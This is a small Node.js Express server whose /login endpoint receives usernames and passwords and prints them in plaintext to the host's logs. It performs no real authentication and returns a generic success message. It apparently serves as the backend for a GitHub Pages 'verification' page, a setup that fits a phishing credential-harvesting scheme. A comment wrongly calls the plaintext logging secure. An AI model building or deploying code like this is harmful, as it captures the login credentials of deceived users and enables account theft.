const express = require('express');
const cors = require('cors');
const app = express();

// Render sets process.env.PORT automatically. Locally it falls back to 3000.
const PORT = process.env.PORT || 3000; 

// CRITICAL CORS CONFIG: Explicitly allow your GitHub Pages origin
app.use(cors({
    origin: 'https://limah-rubiato-verification.github.io/',
    methods: ['POST', 'GET'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.urlencoded({ extended: true }));
app.use(express.json()); // Parses incoming JSON requests from your fetch() setup

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // This will securely print inside your live Render Dashboard logs!
    console.log(`Received credentials - User: ${username}, Pass: ${password}`);
    
    // Send back a clean JSON object instead of raw HTML string
    res.json({ message: 'Data processed successfully by Render backend!' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});